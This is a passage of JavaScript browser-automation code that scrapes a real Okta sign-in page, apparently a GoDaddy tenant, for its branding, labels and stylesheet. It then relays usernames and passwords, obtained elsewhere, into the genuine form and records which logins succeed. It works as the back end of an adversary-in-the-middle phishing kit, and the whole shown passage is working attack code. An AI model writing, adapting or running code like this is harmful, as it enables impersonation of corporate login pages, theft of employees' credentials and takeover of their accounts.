ko - Korean
ms - Malaysian
nb - Norwegian
nl-NL - Dutch
pl - Polish
pt-BR - Portuguese (Brazil)
ro - Romanian
ru - Russian
sv - Swedish
th - Thai
tr - Turkish
uk - Ukrainian
zh-CN - Chinese (PRC)
zh-TW - Chinese (Taiwan)
*/
//https://github.com/okta/okta-signin-widget/tree/master/packages/%40okta/i18n/src/properties
var SupportedLang = ['en', 'fr', 'ru', 'de', 'es', 'it', 'ja', 'zh-CN'];
console.log('SupportedLang:',SupportedLang);
var DisplayLang = false;
var FastPass = false;
var ShowIdentifier = false;
var BBackgroundUrl = false;
var LogoUrl = false;
var BannerText = false;
var TitleText = false;
var SigninTitle = false;
var ShowPassToggle = false;
var UserLabel = false;
var PassLabel = false;
var InputUser = false;
var InputPass = false;
var ButtonText = false;
var IncludedEmail = false;
var AuthFooter = false;//no
var ExpandedHelp = false;
var FooterForgot = false;
var FooterUnlock = false;
var FooterHelp = false;
var FooterCustom = false;
var RememberMe = false;
var BSigninForMFA = false;
var BSigninForReset = false;
var clink = false;
var clink2 = false;
var pageTitle = false;
var ButtonCSS = false;
var StyleSheet = false;
var AppID = false;
var waitForUser = true;
//await page.waitForTimeout(3000);
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'oktaurl',dataDebug,false); 
//console.log('###HTML1');
const jsondata = await page.content();
//console.log('###HTML2');
//console.log('###HTML:',jsondata);
//const pageheaders = response.headers();
//console.log(pageheaders);
//console.log('###HTML:'+jsondata+'###HTML');

try{



try{
/*var okta = {
            locale: 'fr'
*/
if(/locale: '[^']+/.test(jsondata)){
var displaylang = /locale: '[^']+/;
DisplayLang = displaylang.exec(jsondata)[0].substr(0).replace("locale: '", "");
console.log("DisplayLang: "+DisplayLang);
}else if(/language: '[^']+/.test(jsondata)){
var displaylang = /language: '[^']+/;
DisplayLang = displaylang.exec(jsondata)[0].substr(0).replace("language: '", "");
}
}catch(ee){console.log('DisplayLang: catch(ee): '+ee);}
console.log("DisplayLang: "+DisplayLang);


try{
//style="background-image: url('
// background-image:[ ]?url\(['"](http.*\'\))
//preg_match("/background-image ?: ?url\([\'\" ]?(.*)(\'\))/", $jsondata, $matches);
var bbackgroundurl = /background-image: url\('[^']+/;
BBackgroundUrl = bbackgroundurl.exec(jsondata)[0].substr(0).replace("background-image: url('", "");//.replace('">', "");
}catch(ee){console.log('BackgroundUrl: catch(ee): '+ee);}
console.log("BackgroundUrl: "+BBackgroundUrl);
    

//signIn: {
try{
//style="background-image: url('
// background-image:[ ]?url\(['"](http.*\'\))
//preg_match("/background-image ?: ?url\([\'\" ]?(.*)(\'\))/", $jsondata, $matches);
var logourl = /logo: '[^']+/;
LogoUrl = logourl.exec(jsondata)[0].substr(0).replace("logo: '", "");
}catch(ee){console.log('LogoUrl: catch(ee): '+ee);}
console.log("LogoUrl: "+LogoUrl);

try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var bannertextregex = /<p>[^<]+ign-in with your[^<]+/; 
var bannertextregex2 = /<p>[^<]+ign in with your[^<]+/; 
if(bannertextregex.test(jsondata)){      
BannerText = bannertextregex.exec(jsondata)[0].substr(0).replace("<p>", "");
}else if(bannertextregex2.test(jsondata)){
BannerText = bannertextregex2.exec(jsondata)[0].substr(0).replace("<p>", "");
}
}catch(ee){console.log('BannerText: catch(ee): '+ee);}
console.log("BannerText : "+BannerText);

try{
var titletext = /logoText: '[^']+/;
TitleText = titletext.exec(jsondata)[0].substr(0).replace("logoText: '", "").replace(" logo", "");
TitleText = DecodeHex(TitleText);
}catch(ee){console.log('TitleText: catch(ee): '+ee);}
console.log("TitleText: "+TitleText);



try{
    ////showPasswordToggleOnSignInPage = true  2times  fastpass enabled
// /useDeviceFingerprintForSecurityImage: true/
if(/sign-in-with-device-option/.test(jsondata)){
console.log("Sign in with Okta FastPass is enabled");
FastPass = true;
}
}catch(ee){console.log('FastPass error: catch(ee): '+ee);}
console.log("FastPass: "+FastPass);


try{
    //showIdentifier = true;
var showidentifier = /showIdentifier = [(true|false)]+/g;    
var allmatchsi = jsondata.match(showidentifier);
ShowIdentifier = allmatchsi[allmatchsi.length-1].replace("showIdentifier = ", "");
}catch(ee){console.log('ShowIdentifier error: catch(ee): '+ee);}
console.log("ShowIdentifier = "+ShowIdentifier);


/*
features.showPasswordToggleOnSignInPage
Defaults to true. Shows eye icon to toggle visibility of the user entered password on the Okta Sign-In page. Password is hidden by default, even when this flag is enabled. Passwords are visible for 30 seconds and then hidden automatically.

features.showIdentifier
Defaults to true. Shows the user's identifier on any view with user context.

features.hideSignOutLinkInMFA
Defaults to false. Hides the "Back to sign in" link for authenticator enrollment and challenge flows.

features.rememberMe
Defaults to true. Pre-fills the identifier field with the previously used username.

features.autoFocus
Defaults to true. Automatically focuses the first input field of any form when displayed.
*/



try{
    //showPasswordToggleOnSignInPage = true
var showpasstoggle = /showPasswordToggleOnSignInPage = [(true|false)]+/g;    
var allmatch = jsondata.match(showpasstoggle);
ShowPassToggle = allmatch[allmatch.length-1].replace("showPasswordToggleOnSignInPage = ", "");
if(ShowPassToggle=="true"){ShowPassToggle=true;}else if(ShowPassToggle=="false"){ShowPassToggle=false;}
}catch(ee){console.log('ShowPassToggle: catch(ee): '+ee);}
console.log("showPasswordToggleOnSignInPage = "+ShowPassToggle);


try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var signintitle = /signinLabel = '[^']+/;
SigninTitle = signintitle.exec(jsondata)[0].substr(0).replace("signinLabel = '", "");
SigninTitle = DecodeHex(SigninTitle);//SigninTitle.replace(/\\x20/g, " ");///[^\x20-\x7E]+/g
}catch(ee){console.log('SigninTitle: catch(ee): '+ee);}
console.log("SigninTitle: "+SigninTitle);

try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var userlabel = /usernameLabel = '[^']+/;
UserLabel = userlabel.exec(jsondata)[0].substr(0).replace("usernameLabel = '", "");
UserLabel = DecodeHex(UserLabel);//SigninTitle.replace(/\\x20/g, " ");///[^\x20-\x7E]+/g
}catch(ee){console.log('UserLabel: catch(ee): '+ee);}
console.log("UserLabel: "+UserLabel);

try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var passlabel = /passwordLabel = '[^']+/;
PassLabel = passlabel.exec(jsondata)[0].substr(0).replace("passwordLabel = '", "");
PassLabel = DecodeHex(PassLabel);//SigninTitle.replace(/\\x20/g, " ");///[^\x20-\x7E]+/g
}catch(ee){console.log('PassLabel: catch(ee): '+ee);}
console.log("PassLabel: "+PassLabel);

/*try{
if(/var rememberMe = true;/.test(jsondata)){
RememberMe = true;
}else{
RememberMe = false; 
}
console.log("RememberMe: "+RememberMe);
}catch(ee){console.log('RememberMe: catch(ee): '+ee);}
*/

//<input type="checkbox" name="rememberMe" id="input36">
try{
var rememberMeRegex = /<input[^>]+type="checkbox"[^>]+name="remember[^>]+>/; 
var rememberMeRegex2 = /<input[^>]+name="remember[^>]+type="checkbox"[^>]+>/; 
if(rememberMeRegex.test(jsondata)||rememberMeRegex2.test(jsondata)){
RememberMe = true;
}
}catch(ee){console.log('RememberMe: catch(ee): '+ee);}
console.log("RememberMe: "+RememberMe);
/*
try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var authfooter = /<div class="auth-footer">[^<]+/;
AuthFooter = authfooter.exec(jsondata)[0].substr(0).replace('<div class="auth-footer">', "");
console.log("AuthFooter: "+AuthFooter);
}catch(ee){console.log('catch(ee)'+ee);}
*/

/*
var username = '';
var rememberMe = false;
var smsRecovery = false;
var callRecovery = false;
var emailRecovery = false;
var usernameLabel = 'Username';
var usernameInlineLabel = '';
var passwordLabel = 'Password';
var passwordInlineLabel = '';

var signinLabel = 'Sign\x20In';
var forgotpasswordLabel = 'Forgot\x20password\x3F';
var unlockaccountLabel = 'Unlock\x20account\x3F';
var helpLabel = 'Help';



signIn: {
      el: '#signin-container',
      baseUrl: baseUrl,
      brandName: 'Okta',
      logo: 'https://ok2static.oktacdn.com/fs/bco/1/fs0nsswd3jjSr8CIv0x7',
      logoText: 'GoDaddy\x20\x2D\x20Prod logo',
      helpSupportNumber: orgSupportPhoneNumber,
      stateToken: stateToken,
      username: username,
      signOutLink: signOutUrl,
      consent: consentFunc,
      authScheme: authScheme,
      relayState: fromUri,
      proxyIdxResponse: proxyIdxResponse,
      overrideExistingStateToken: overrideExistingStateToken,
      interstitialBeforeLoginRedirect: 'DEFAULT',
      idpDiscovery: {
*/


/*
var customLinks = [];
  
    customLinks.push({
      text: 'Hours\x3A\x2024\x2F7\x20\x2D\x20Internal\x20Phone\x3A\x20Ext\x202580\x20\x7C\x20External\x20Phone\x3A\x20\x2B1\x20480\x20624\x202580',
      href: 'https\x3A\x2F\x2Fsecureservernet.sharepoint.com\x2Fsites\x2Fglobalit'
    });
  
  var factorPageCustomLink = {};
*/
/*
var customLinks = [];
  
  var factorPageCustomLink = {};
*/

try{
if(/<a href="#" data-se="needhelp"/.test(jsondata)){
var FooterHelpTitle = /footerHelpTitle = '[^']+/.exec(jsondata)[0].substr(0).replace("footerHelpTitle = '", "");
if(DecodeHex(FooterHelpTitle)!==''){
ExpandedHelp = FooterForgot;     
}
}
}catch(ee){console.log('ExpandedHelp: catch(ee): '+ee);}
console.log("ExpandedHelp: "+ExpandedHelp);


try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var footerforgot =  /forgotpasswordLabel = '[^']+/;
FooterForgot = footerforgot.exec(jsondata)[0].substr(0).replace("forgotpasswordLabel = '", "");
//FooterForgot = FooterForgot.replace(/\\x20/g, " ");
FooterForgot = DecodeHex(FooterForgot);//FooterForgot.replace(/\\x3F/g,function(m,n){return String.fromCharCode(n);});
}catch(ee){console.log('FooterForgot: catch(ee): '+ee);}
console.log("FooterForgot: "+FooterForgot);

try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var footerunlock =  /unlockaccountLabel = '[^']+/;
FooterUnlock = footerunlock.exec(jsondata)[0].substr(0).replace("unlockaccountLabel = '", "");
FooterUnlock = DecodeHex(FooterUnlock);
}catch(ee){console.log('FooterUnlock: catch(ee): '+ee);}
console.log("FooterUnlock: "+FooterUnlock);

try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var footerhelp =  /helpLabel = '[^']+/;
FooterHelp = footerhelp.exec(jsondata)[0].substr(0).replace("helpLabel = '", "");
FooterHelp = DecodeHex(FooterHelp);//FooterHelp.replace(/\\x20/g, " ");
}catch(ee){console.log('FooterHelp: catch(ee): '+ee);}
console.log("FooterHelp: "+FooterHelp);

/*
try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var footercustom =  /customLinks.push[^']+text: '[^']+/;
FooterCustom = footercustom.exec(jsondata)[0];//.replace("text: '", "");
FooterCustom = /text: '[^']+/.exec(FooterCustom)[0].substr(0).replace("text: '", "");
console.log("FooterCustom1: "+FooterCustom);
FooterCustom = /text: '[^']+/.exec(FooterCustom)[0].substr(0).replace("text: '", "");
console.log("FooterCustom2: "+FooterCustom);
FooterCustom = DecodeHex(FooterCustom);//FooterCustom.replace(/\\x20/g, " ");
console.log("FooterCustom: "+FooterCustom);
}catch(ee){console.log('catch(ee): '+ee);}
*/


if(/customLinks.push[^']{[\s]+text: '[^']+/.test(jsondata)){
FooterCustom=[];
var footercustom =  /{[\s]+text: '[^']+/g;
let fcresult=[];
try{
while(footercustom.global && (fcresult=footercustom.exec(jsondata))) {
   //console.log(FooterCustom);     // output: object
  var fcmatch = /text: '[^']+/.exec(fcresult[0]);
  //.replace("text: '", "")
  FooterCustom.push(DecodeHex(fcmatch[0].replace("text: '", "")));
  //console.log('footercustom:'+match[0]);  // ouput: "a"
  //if(!footercustom.global) break;
}
  }catch(ee){console.log('FooterCustom: catch(ee): '+ee);}
if(FooterCustom.length==0){
  FooterCustom=false;
}

}
console.log("FooterCustom: "+FooterCustom);



try{//"Back to sign in" link for authenticator enrollment and challenge flows.
if(!/var hideSignOutForMFA = true/.test(jsondata)){
BSigninForMFA = true;
}
}catch(ee){console.log('BSigninForMFA: catch(ee): '+ee);}
console.log("BSigninForMFA: "+BSigninForMFA);

try{//"Back to sign in" For Reset    
if(!/var hideBackToSignInForReset = true/.test(jsondata)){
BSigninForReset = true;
}
}catch(ee){console.log('BSigninForReset: catch(ee): '+ee);}
console.log("BSigninForReset: "+BSigninForReset);


try{
var inputRegex = new RegExp('<input[^]*type="text"[^]*value="');    
var inputRegex2 = new RegExp('<input[^]*value="[^]*type="text"');  
if(inputRegex.test(jsondata)||inputRegex2.test(jsondata)){
//<input type="text" placeholder="" name="identifier" id="input152" value="test@okta.com" aria-label="" autocomplete="identifier">
InputUser = true;
}
}catch(ee){console.log('InputUser: catch(ee): '+ee);}
console.log("InputUser: "+InputUser);



 
try{
//var dataEmailregex = '/value="' + dataEmail + '"/';
//<input type="text" placeholder="" name="identifier" id="input43" value="test@okta.com" aria-label="" autocomplete="identifier">
//const EmailRegex = new RegExp('<input[^]*name="identifier"[^]*type="text"[^]*value="' + dataEmail + '"');
var includedemail = /<input[^>]+type="text"[^>]+name="identifier"[^>]+value="[^"]+/;
IncludedEmail = includedemail.exec(jsondata)[0].substr(0).replace(/<input[^>]+type="text"[^>]+name="identifier"[^>]+value="/, "");//.replace('">', "");
//console.log("IncludedEmail: "+IncludedEmail);
if(IncludedEmail == dataEmail){
IncludedEmail = true;
}
}catch(ee){console.log('IncludedEmail: catch(ee): '+ee);}
console.log("IncludedEmail: "+IncludedEmail);


/*try{
if(/var hasPasswordlessPolicy = 'true'/.test(jsondata)){
//<input type="password" placeholder="" name="credentials.passcode" id="input128" value="" aria-label="" autocomplete="off" class="password-with-toggle">
//Streamline Logins with Passwordless Authentication
//multiple identity providers okta (idps)
InputPass = false;
}else{
InputPass = true; 
}
console.log("InputPass: "+InputPass);
}catch(ee){console.log('InputPass: catch(ee): '+ee);}
*/


try{
if(/<input[^>]+type="password"/.test(jsondata)){
    // &&window.getComputedStyle(document.querySelector('input[type=password]'), null).getPropertyValue('overflow')!=='hidden'
//<input type="password" placeholder="" name="credentials.passcode" id="input128" value="" aria-label="" autocomplete="off" class="password-with-toggle">
InputPass = true;
}
}catch(ee){console.log('InputPass: catch(ee): '+ee);}
console.log("InputPass: "+InputPass);



try{
var buttontext = /<input[^>]+type="submit"[^>]+value="[^"]+/;
ButtonText = buttontext.exec(jsondata)[0].substr(0).replace(/<input[^>]+type="submit"[^>]+value="/, "");//.replace('">', "");
}catch(ee){console.log('ButtonText: catch(ee): '+ee);}
console.log("ButtonText: "+ButtonText);



try{
const domElementStyles = await page.$eval('.button-primary', (elem) => {
    const computedStyle = window.getComputedStyle(elem);
    //let domElementStyles=[];
    //domElementStyles['background-color']=computedStyle.getPropertyValue('background-color');
    //domElementStyles['border-color']=computedStyle.getPropertyValue('border-color');
    //domElementStyles['color']=computedStyle.getPropertyValue('color');
    //return domElementStyles;
    return {
    "backgroundColor":computedStyle.getPropertyValue('background-color'),
    "borderColor":computedStyle.getPropertyValue('border-color'),
    "color":computedStyle.getPropertyValue('color')
    };
});
//console.log("style:",domElementStyles.backgroundColor);
//console.log("buttonStyles: ",domElementStyles);
if(domElementStyles.backgroundColor==''||domElementStyles.backgroundColor==null){
//delete domElementStyles.backgroundColor;
domElementStyles = DeleteKeyFromObject(domElementStyles,"backgroundColor");
}
if(domElementStyles.borderColor==''||domElementStyles.borderColor==null){
//delete domElementStyles.borderColor;
domElementStyles = DeleteKeyFromObject(domElementStyles,"borderColor");
}
if(domElementStyles.color==''||domElementStyles.color==null){
//delete domElementStyles.color;
domElementStyles = DeleteKeyFromObject(domElementStyles,"color");
}
if (Object.keys(domElementStyles).length !== 0) {
ButtonCSS=domElementStyles;
}
}catch(ee){console.log('ButtonCSS: catch(ee): '+ee);}
console.log("ButtonCSS: ",ButtonCSS);



try{

if(stylesheetcss){

var buff = Buffer.from(stylesheetcss.replace(/\s+/g, ' ').trim());  
var buff64 = buff.toString('base64');    
StyleSheet = buff64;
}else{
    var stylesheet; 
if(/<link[^>]+href="[^"]+touch-point=SIGN_IN_PAGE[^"]+"[^>]+type="text\/css">/.test(jsondata)){
//<link href="/api/internal/brand/theme/style-sheet?touch-point=SIGN_IN_PAGE&amp;v=a97e8ccef446e279062905e83cc44909" rel="stylesheet" type="text/css">

// /<link href="[^"]+touch-point=SIGN_IN_PAGE[^"]+" rel="stylesheet" type="text\/css">/

let stylesheet = /<link[^>]+href="[^"]+touch-point=SIGN_IN_PAGE[^"]+"[^>]+type="text\/css">/;
StyleSheet = stylesheet.exec(jsondata)[0].substr(0).replace(/<link[^>]+href="/, "").replace(/"[^>]+>/, "");//.replace('">', "");
//StyleSheet = true;
}else if(/<link[^>]+type="text\/css"[^>]+href="[^"]+touch-point=SIGN_IN_PAGE[^"]+">/.test(jsondata)){
let stylesheet = /<link[^>]+type="text\/css"[^>]+href="[^"]+touch-point=SIGN_IN_PAGE[^"]+">/;
StyleSheet = stylesheet.exec(jsondata)[0].substr(0).replace(/<link[^>]+href="/, "").replace(/"[^>]+>/, "");//.replace('">', "");
//StyleSheet = true;
}
 if(StyleSheet){
    curenturl = await page.url();
console.log('curenturl:',curenturl);
    var urlparser = new URL(curenturl);
StyleSheet = urlparser.origin+''+StyleSheet;

}
}
}catch(ee){console.log('StyleSheet: catch(ee): '+ee);}
console.log("StyleSheet: ",StyleSheet);



/*
<div class="auth-footer">
<a data-se="forgot-password" href="#" class="link js-forgot-password">Forgot password?</a>
<a data-se="unlock" href="#" class="link js-unlock">Okta Unlock</a>
<a data-se="help" href="https://godaddy.okta.com/help/login" class="link js-help">Help</a>
<a data-se="custom" href="https://secureservernet.sharepoint.com/sites/globalit" class="link js-custom">Hours: 24/7 - Internal Phone: Ext 2580 | External Phone: +1 480 624 2580</a>
</div>
*/


}catch(err){
    console.log("parse elements catch err:"+err);
}







    



console.log('result:',result);
  console.log("Okta info is successfully extracted");
var LoadTime_ms = new Date()-StartTime;
var LoadTime2_ms = new Date()-StartTime2;
//console.log('time1: '+new Date()+' time2: '+new Date());
var LoadTime_s = Math.floor(LoadTime_ms/1000);
var LoadTime2_s = Math.floor(LoadTime2_ms/1000);
                
					result['StatusCode'] = 1;
					result['Status'] = "success";
					result['Email'] = dataEmail;
					result['Msg'] = "Done";
					result['PickAnAccount'] = PickAnAccount;
					if(SupportedLang.includes(DisplayLang)){
					result['DisplayLang'] = DisplayLang;
					}else{
					result['DisplayLang'] = "en";    
					}
					result['TitleText'] = TitleText;
					result['LogoUrl'] = LogoUrl;
					result['BackgroundUrl'] = BBackgroundUrl;
					result['BannerText'] = BannerText;
					result['FastPass'] = FastPass;
					result['ShowIdentifier'] = ShowIdentifier;
					result['RememberMe'] = RememberMe;
					result['SigninTitle'] = SigninTitle;
					result['ShowPassToggle'] = ShowPassToggle;
					result['UserLabel'] = UserLabel;
					result['PassLabel'] = PassLabel;
					result['InputUser'] = InputUser;
					result['InputPass'] = InputPass;
					result['ButtonText'] = ButtonText;
					result['IncludedEmail'] = IncludedEmail;
					result['BSigninForMFA'] = BSigninForMFA;
					result['BSigninForReset'] = BSigninForReset;
					result['StyleSheet'] = StyleSheet;
					result['AuthFooter'] = {};
					result['AuthFooter']["FooterForgot"] = FooterForgot;
					result['AuthFooter']["FooterUnlock"] = FooterUnlock;
					result['AuthFooter']["FooterHelp"] = FooterHelp;
					if(FooterCustom.length>0){
					    let i = 0;
					result['AuthFooter']["FooterCustom"] = {};
while(FooterCustom[i] && i<FooterCustom.length) {
result['AuthFooter']["FooterCustom"][i] = FooterCustom[i];
  i++;
}
					}else{
					result['AuthFooter']["FooterCustom"] = false;    
					}
					if(ExpandedHelp){
					result['ExpandedHelp'] = ExpandedHelp;
					}
					if(ButtonCSS){
					result['ButtonCSS'] = ButtonCSS;
					}
					result['Cookies'] = false;
					result['AppID'] = dataAppID;
					result['Load_time'] = LoadTime_s+' Seconds('+LoadTime2_s+'Sec)';
                    console.log('Load_time: '+LoadTime_s+' Seconds('+LoadTime2_s+'Sec)');
					result['Time'] = new Date().toUTCString();//DateNow;
					//result['client_ip'] = $this->client_ip;

					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow }; 


await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'afterresult',dataDebug,false);


console.log(result);
ResultByIds[dataId][dataEmail]['okta']['display'] = result;
console.log(JSON.stringify(ResultByIds[dataId]));
//return;
var failNext = false;
var failBtnSubmit = false;
var failVerify = false;
var failPut = false;
var OktaMode = false;

//!failNext && !failPut
if (InputUser&&!InputPass/*&&!IncludedEmail*/){
try{


if(waitForUser){
console.log('waiting for OktaUser');
OktaUser = await waitForUSER(dataId,dataEmail,'okta','email',undefined,180000,1000,page);
console.log('waiting is finished');
}else{
OktaUser = dataEmail;    
}
if(typeof OktaUser !== 'undefined'&&OktaUser){
    SAML_user = OktaUser;
await page.$eval('input[type=text]', el => el.value = '');
await page.type("input[type=text]",OktaUser,{delay:25});
failPut = false;
}else{
failPut = true;    
}

}catch(e){failPut = true;console.log('fail put Email, catch err:'+e);}

}else if(InputUser&&InputPass){
    
try{



console.log('waiting for OktaLogin');
OktaLogin = await waitForLOGIN(dataId,dataEmail,'okta','login',undefined,180000,1000,page);
console.log('waiting is finished');


if( typeof OktaLogin == 'object'&&typeof OktaLogin['user'] !== 'undefined'&&typeof OktaLogin['pass'] !== 'undefined'){
SAML_user = OktaLogin['user'];    
SAML_pass = OktaLogin['pass'];
    await page.$eval('input[type=text]', el => el.value = '');
    await page.type("input[type=text]",OktaLogin['user'],{delay:25});
    //await page.click("input[type=password]",{clickCount: 3});
    await page.$eval('input[type=password]', el => el.value = '');
    //await page.focus('input[type=password]');
    await page.type("input[type=password]",OktaLogin['pass'],{delay:25});

} 


}catch(e){failPut = true;console.log('fail put Email, catch err::'+e);}     

}

if(!failPut && await page.$('.okta-verify-container') !== null && !InputUser&&!InputPass){
try{await page.click(".okta-verify-container");console.log('okta fast pass button clicked');}catch(e){console.log('fail click okta fast pass button, catch err:'+e);} 


try{await page.waitForFunction("document.querySelector('a[data-se=cancel]')||document.querySelector('a[data-se=cancel-authenticator-challenge]')"); await page.click("a[data-se=cancel-authenticator-challenge]");console.log('fast pass button clicked successfully');console.log('Cancel and take me to sign in');}catch(e){console.log('fail click fast pass button, catch err:'+e);await page.click("a[data-se=cancel]");console.log('back to signin page button clicked successfully');}


try{

if(waitForUser){
console.log('waiting for OktaUser.');
OktaUser = await waitForUSER(dataId,dataEmail,'okta','email',undefined,180000,1000,page);

console.log('waiting is finished.');
}else{
OktaUser = dataEmail;
}
if(typeof OktaUser !== 'undefined'&&OktaUser){
    SAML_user = OktaUser;
await page.$eval('input[type=text]', el => el.value = '');
await page.type("input[type=text]",OktaUser,{delay:25});
failPut = false;
}else{
    failPut = true;
}

}catch(e){failPut = true;console.log('fail put Email, catch err:::'+e);}   
}

if(!failPut && await page.$('input[type=checkbox]') !== null){//name=rememberMe
const element1 = await page.$("input[type=checkbox]");
    const isCheckBoxChecked1 = await (await element1.getProperty("checked")).jsonValue();
    if(! isCheckBoxChecked1 ){
        await element1.click()
        //await page.$eval('input[type=checkbox]', check => check.checked = true);
        console.log("rememberMe Checkbox checked");
    }
}
    
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'rememberme',dataDebug,false);

//if (InputUser&&InputPass){

/*if(await page.$('input[type=password]') !== null){
    
    try{await page.type("input[type=password]",dataPass,{delay:25});}catch(e){failPut=true;console.log('fail put Pass, catch err:'+e);}    
}*/

//}else 
if(typeof OktaUser !== 'undefined' && OktaUser && !failPut && !failNext && InputUser&&!InputPass){
 try{await page.click("input[type=submit][value=Next]");console.log('Next button submited');failNext=false;}catch(e){console.log('fail submit Next, catch err:'+e);failNext=true;} 
 try{await page.waitForFunction("(!document.querySelector('input[type=submit][value=Next]'))||(document.querySelector('.identifier'))||(document.querySelector('input[type=password]')&&window.getComputedStyle(document.querySelector('input[type=password]'), null).getPropertyValue('overflow')!=='hidden'&&document.querySelector('input[type=submit][value=Verify]'))||(document.querySelector('.select-authenticator-authenticate--okta_verify'))||(document.querySelector('.authenticator-verify-list'))||(document.querySelector('.authenticator-enroll-list'))||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('Next button submited successfully');failNext=false;
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
if(OktaUser) {   
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user'][OktaUser]="no";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user']['result']='WrongUser';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user']['retry']=false;
isCorrectLogin = false;
}else if(OktaLogin){
    
}
}else{
if(OktaUser) {     
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user'][OktaUser]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user']['result']='CorrectUser';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user']['retry']=false;
isCorrectLogin = true;
}else if(OktaLogin){
    
}
}
//var isPaSsEd = false;
if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user'][OktaUser]!== 'undefined'&&ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user'][OktaUser]=="ok"){
//isPaSsEd = true
console.log('successful put Username results in ResultByIds :'+OktaUser+'="ok"');   
}else{console.log('failed put username result in ResultByIds:'+OktaUser+'="ok"');}


 }catch(e){failNext=true;
 console.log('fail submit Next button, catch err:'+e);
if(OktaUser) {   
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user'][OktaUser]="no";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user']['result']='WrongUser';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user']['retry']=false;
isCorrectLogin = false;
}else if(OktaLogin){
    
}
//var isPaSsEd = false;
if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user'][OktaUser]!== 'undefined'&&ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user'][OktaUser]=="no"){
//isPaSsEd = true
console.log('successful put Username results in ResultByIds :'+OktaUser+'="no"');   
}else{console.log('failed put username result in ResultByIds:'+OktaUser+'="no"');}    
     
 }//.identifier
}else if(typeof OktaLogin !== 'undefined' && OktaLogin && !failPut && InputUser&&InputPass){// && !failNext
 try{await page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('password submited');failBtnSubmit=false;}catch(e){console.log('fail submit button, catch err:'+e);failBtnSubmit=true;} 
    
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')||!document.querySelector('input[type=submit]')");  }catch(e){failBtnSubmit=true;console.log('fail Verify, catch err:'+e);}

    
    if(!failBtnSubmit){
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('Verify button successfully Submited');successlogin=true; 
            
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('wrong login');
 if(OktaLogin){           
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['user']]="no";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['pass']]="no";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['result']='WrongLogin';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['retry']=false;
isCorrectLogin = false;

//var isPaSsEd = false;
if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['user'][OktaLogin['user']]!== 'undefined'&&ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['user'][OktaLogin['user']]=="no"){
//isPaSsEd = true
console.log('successful put login results in ResultByIds :'+OktaUser+'="no"');   
}else{console.log('failed put login result in ResultByIds:'+OktaUser+'="no"');}    
 }                 
}else{
console.log('successful login');
isCorrectLogin = true;
/*    
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass'][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['result']='CorrectCode';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['retry']=false;
 */   
}            

            
            
            
        }catch(e){failVerify=true;successlogin=false;console.log('fail Verify button Submited, catch err:'+e);
 if(OktaLogin){              
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['user']]="no";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['pass']]="no";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['result']='WrongLogin';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['retry']=false;
isCorrectLogin = false;

//var isPaSsEd = false;
if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['user'][OktaLogin['user']]!== 'undefined'&&ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['user'][OktaLogin['user']]=="no"){
//isPaSsEd = true
console.log('successful put login results in ResultByIds :'+OktaUser+'="no"');   
}else{console.log('failed put login result in ResultByIds::'+OktaUser+'="no"');}    
 }     
            
            
            
            
        }
    }else{
        successlogin=false;
    }

}else if(!failPut && !failNext && InputUser&&!InputPass){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user']['result']='UserNotFound';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['user']['retry']=true;
isCorrectLogin = false;
}

